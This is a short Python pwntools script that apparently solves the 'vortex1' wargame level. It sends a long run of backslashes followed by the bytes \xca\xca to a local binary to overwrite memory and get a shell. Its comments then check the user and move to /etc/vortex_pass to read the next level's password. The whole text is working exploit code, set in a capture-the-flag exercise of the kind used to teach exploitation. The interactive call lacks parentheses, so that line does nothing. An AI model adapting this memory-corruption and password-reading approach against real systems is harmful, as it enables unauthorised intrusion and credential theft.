#!/usr/bin/env python
from pwn import *

r = process("./vortex1")

r.send("\\"*261)
r.send("\xca\xca")

r.interactive

# whoami
# cd /etc/vortex_pass && ls
